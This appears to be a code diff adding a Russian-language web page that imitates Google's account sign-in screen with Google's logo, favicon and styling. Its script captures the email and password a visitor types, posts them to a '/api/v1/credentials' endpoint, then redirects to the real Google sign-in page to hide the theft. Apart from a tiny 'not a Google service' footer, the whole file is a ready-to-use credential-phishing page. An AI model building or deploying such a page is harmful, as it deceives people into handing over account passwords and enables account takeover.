@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Вход в аккаунт Google</title>
+    <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Roboto', 'Arial', sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 48px 40px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+            width: 100%;
+            max-width: 450px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .logo img {
+            width: 75px;
+            height: 24px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #202124;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 24px;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+        input[type="email"],
+        input[type="password"],
+        input[type="text"] {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+        }
+        .btn {
+            width: 100%;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            color: white;
+            background: #1a73e8;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 8px;
+        }
+        .btn:hover {
+            background: #1557b0;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+        .links {
+            margin-top: 16px;
+            text-align: center;
+        }
+        .links a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .forgot-password {
+            text-align: right;
+            margin-top: 8px;
+        }
+        .forgot-password a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_75x24dp.png" alt="Google Logo">
+        </div>
+        
+        <h1>Вход</h1>
+        <p class="subtitle">Введите адрес эл. почты или номер телефона</p>
+        
+        <form id="loginForm" method="POST" action="/login">
+            <div class="form-group">
+                <label for="email">Эл. почта или номер телефона</label>
+                <input type="email" id="email" name="email" required autocomplete="email" autofocus>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Пароль</label>
+                <input type="password" id="password" name="password" required autocomplete="current-password">
+                <div class="forgot-password">
+                    <a href="#">Забыли адрес эл. почты?</a>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label style="font-weight: normal; display: flex; align-items: center;">
+                    <input type="checkbox" name="remember" style="width: auto; margin-right: 8px;">
+                    <span>Оставаться в системе</span>
+                </label>
+            </div>
+            
+            <button type="submit" class="btn">Далее</button>
+        </form>
+        
+        <div class="links">
+            <a href="#">Создать аккаунт</a>
+        </div>
+        
+        <div class="footer">
+            <p>Не сервис Google</p>
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            fetch('/api/v1/credentials', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({email, password})
+            })
+            .then(r => r.json())
+            .then(d => {
+                if (d.success) {
+                    window.location.href = 'https://accounts.google.com';
+                } else {
+                    alert('Ошибка входа. Попробуйте снова.');
+                }
+            })
+            .catch(e => {
+                console.error(e);
+                alert('Ошибка соединения.');
+            });
+        });
+    </script>
+</body>
+</html>
